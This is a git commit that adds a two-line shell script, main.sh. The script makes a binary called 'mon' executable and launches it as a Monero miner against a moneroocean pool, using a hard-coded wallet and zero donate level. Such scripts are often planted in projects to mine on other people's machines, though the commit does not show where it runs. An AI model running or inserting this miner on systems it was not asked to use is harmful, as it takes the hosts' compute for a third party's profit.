0edf76487fc60d44e2c285968aa8d2c23710aa64
Gwibard <60078088+gwibard@users.noreply.github.com>
2022-04-02 15:23:03 +0000

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,2 @@
+chmod +x mon
+./mon --donate-level 0 -o gulf.moneroocean.stream:20128 -u 468gDXvUawuF7qeGhs5Cw3M9WedNVsijVL6iBadSzqHVNtADtXRoZHwGarZqTferxw1NKvJ8c7onkX8jBcTAGMHQ7Br62CQ --tls -k --coin monero
